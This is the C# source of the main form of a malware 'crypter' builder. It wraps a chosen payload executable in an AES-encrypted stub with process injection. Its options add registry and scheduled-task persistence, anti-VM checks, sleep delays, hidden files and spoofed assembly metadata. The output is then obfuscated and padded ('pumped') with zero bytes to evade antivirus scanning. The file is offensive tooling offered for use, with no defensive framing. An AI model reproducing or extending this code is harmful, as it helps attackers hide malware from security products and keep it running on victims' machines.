using Crypter.Core;
using Crypter.Forms;
using Crypter.Obfuscator;
using dnlib.DotNet;
using dnlib.DotNet.Writer;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.Remoting.Contexts;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Crypter
{
    public partial class MainFrm : Form
    {
        private Settings settings;
        private Thread pump;

        public FormInformation formInformation;

        public MainFrm()
        {
            InitializeComponent();
            this.settings = new Settings();
            this.formInformation = new FormInformation();

            SetupFoldername();
            runpeTypeBox.Text = "Itself";
            encryptionTypeBox.Text = "AES";
        }

        private void SetupFoldername()
        {
            const string ApplicationDataFolder = "ApplicationData";
            foreach (var typeSpecialFolder in Enum.GetValues(typeof(Environment.SpecialFolder)))
            {
                specialBox.Items.Add(typeSpecialFolder);
                if (typeSpecialFolder.ToString() == ApplicationDataFolder)
                {
                    specialBox.Text = ApplicationDataFolder;
                }
            }
        }

        private void CallObfuscator(SaveFileDialog selectSaveDialog)
        {
            Obfuscate obf = new Obfuscate();
            string savingLocation = Path.GetDirectoryName(selectSaveDialog.FileName);
            string fileName = Path.GetFileNameWithoutExtension(Path.GetFileNameWithoutExtension(selectSaveDialog.FileName));

            ModuleDefMD module = ModuleDefMD.Load(Path.GetFullPath(selectSaveDialog.FileName));
            obf.Execute(module);

            Console.WriteLine("Saving file...");
            var opts = new ModuleWriterOptions(module);
            opts.Logger = DummyLogger.NoThrowInstance;

            string file = savingLocation + @"\" + fileName + "_encryptix" + ".exe";
            module.Write(file, opts);
        }

        private void StartPumping(string filePath)
        {
            if (!string.IsNullOrEmpty(filePath))
            {
                if (long.TryParse(PumperStr.Text, out long size))
                {
                    pump = new Thread(() => Pump(filePath));
                    pump.Start();
                }
                else
                {
                    MessageBox.Show("Please enter a valid number for pumping.");
                }
            }
            else
            {
                MessageBox.Show("Please enter a value for pumping.");
            }
        }


        private void Pump(string filePath)
        {
            try
            {
                using (var file = File.OpenWrite(filePath))
                {
                    long siz = file.Seek(0, SeekOrigin.End);
                    long targetSize = siz + long.Parse(PumperStr.Text) * 1024 * 1024;
                    while (siz < targetSize)
                    {
                        siz++;
                        file.WriteByte(0);
                    }
                }
                //MessageBox.Show("File Pumped!");
                Console.WriteLine("File Pumped!");
            }
            catch (Exception ex)
            {
                MessageBox.Show("An error occurred: " + ex.Message);
            }
        }

        private void sleepCheck_CheckedChanged(object sender, EventArgs e)
        {
            if (sleepCheck.CheckState == CheckState.Checked)
            {
                sleepNum.Enabled = true;
            }
            else
            {
                sleepNum.Enabled = false;
            }
        }

        private void buildBtn_Click_1(object sender, EventArgs e)
        {

            if (string.IsNullOrEmpty(payloadTxt.Text))
            {
                MessageBox.Show("Payload field cannot be empty!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            using (SaveFileDialog selectSaveDialog = new SaveFileDialog())
            {
                selectSaveDialog.Filter = "Executable (*.exe)|*.exe";

                if (selectSaveDialog.ShowDialog() == DialogResult.OK)
                {
                    string Source = Properties.Resources.Stub;

                    if (regeditCheck.CheckState == CheckState.Checked)
                    {
                        settings.doInstall = true;
                        settings.doRegedit = true;
                    }
                    if (schtasksChk.CheckState == CheckState.Checked)
                    {
                        settings.doInstall = true;
                        settings.doSchtasks = true;
                    }
                    if (sleepCheck.CheckState == CheckState.Checked)
                    {
                        settings.doSleep = true;
                    }
                    if (antiVM.CheckState == CheckState.Checked)
                    {
                        settings.doAntiVM = true;
                    }
                    if (hiddenFile.CheckState == CheckState.Checked)
                    {
                        settings.HIDDENFILE = true;
                    }


                    settings.buildDirectory = selectSaveDialog.FileName;

                    this.Build();

                    CallObfuscator(selectSaveDialog);
                    GC.Collect();
                    GC.WaitForPendingFinalizers();

                    if (filePumper.CheckState == CheckState.Checked)
                    {
                        //StartPumping(selectSaveDialog.FileName);

                        string obfFilePath = Path.GetDirectoryName(selectSaveDialog.FileName) + @"\" + Path.GetFileNameWithoutExtension(selectSaveDialog.FileName) + "_encryptix.exe";
                        StartPumping(obfFilePath);
                    }

                    File.Delete(selectSaveDialog.FileName);
                }
            }
        }

        private bool Build()
        {
            settings.payloadName = payloadTxt.Text;
            settings.decryptKey = Path.GetRandomFileName().Replace(".", "");
            settings.stubResources = Path.GetRandomFileName().Replace(".", "");
            settings.injectionName = runpeTypeBox.Text;

            EncryptionType encType = (EncryptionType)Enum.Parse(typeof(EncryptionType), encryptionTypeBox.Text);
            settings.encryptionType = encType;

            settings.fileName = filenameTxt.Text;
            settings.folderName = foldernameTxt.Text;
            settings.specialDir = specialBox.Text;
            settings.regeditName = regeditNameTxt.Text;
            settings.schtasksName = schtasksNameTxt.Text;


            settings.AssemblyTitle = formInformation.txtProduct.Text;
            settings.AssemblyCopyright = formInformation.txtCopyright.Text;
            settings.AssemblyDescription = formInformation.txtDescription.Text;
            settings.AssemblyProduct = formInformation.txtProduct.Text;
            settings.AssemblyCopyright = formInformation.txtCompany.Text;
            settings.AssemblyCopyright = formInformation.txtCopyright.Text;
            settings.AssemblyTrademark = formInformation.txtTrademark.Text;
            settings.AssemblyMajorVersion = formInformation.assemblyMajorVersion.Value.ToString();
            settings.AssemblyMinorVersion = formInformation.assemblyMinorVersion.Value.ToString();
            settings.AssemblyBuildPart = formInformation.assemblyBuildPart.Value.ToString();
            settings.AssemblyPrivatePart = formInformation.assemblyPrivatePart.Value.ToString();

            settings.AssemblyIcon = formInformation.txtIcon.Text;

            settings.sleep = (int)sleepNum.Value;

            object bld = null;
            var thread = new Thread(() =>
            {
                bld = new Builder.Builder(settings).Build();
            });
            thread.Start();
            thread.Join();
            thread.Abort();
            return Convert.ToBoolean(bld);
        }

        private void regeditCheck_CheckedChanged(object sender, EventArgs e)
        {
            if (regeditCheck.CheckState == CheckState.Checked)
            {
                filenameTxt.Enabled = true;
                foldernameTxt.Enabled = true;
                specialBox.Enabled = true;
                regeditNameTxt.Enabled = true;
            }
            else
            {
                regeditNameTxt.Enabled = false;
            }

            if (regeditCheck.CheckState == CheckState.Unchecked)
            {
                regeditNameTxt.Enabled = false;
                filenameTxt.Enabled = false;
                foldernameTxt.Enabled = false;
                specialBox.Enabled = false;
                regeditNameTxt.Enabled = false;
            }
        }

        private void schtasksChk_CheckedChanged(object sender, EventArgs e)
        {
            if (schtasksChk.Checked)
            {
                filenameTxt.Enabled = true;
                foldernameTxt.Enabled = true;
                specialBox.Enabled = true;
                schtasksNameTxt.Enabled = true;
            }
            else
            {
                schtasksNameTxt.Enabled = false;
            }

            if (schtasksChk.CheckState == CheckState.Unchecked)
            {
                schtasksNameTxt.Enabled = false;
                filenameTxt.Enabled = false;
                foldernameTxt.Enabled = false;
                specialBox.Enabled = false;
                regeditNameTxt.Enabled = false;
            }
        }

        private void browsePayloadBtn_Click_1(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Filter = "Executable (*.exe)|*.exe";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    payloadTxt.Text = ofd.FileName;
                    buildBtn.Enabled = true;
                }
                else
                {
                    buildBtn.Enabled = false;
                }
            }
        }

        private void assemblyBtn_Click_1(object sender, EventArgs e)
        {
            formInformation.ShowDialog();
        }

        private void filePumper_CheckedChanged(object sender, EventArgs e)
        {
            if (filePumper.CheckState == CheckState.Checked)
            {
                PumperStr.Enabled = true;
            }
            else
            {
                PumperStr.Enabled = false;
            }
        }
    }
}
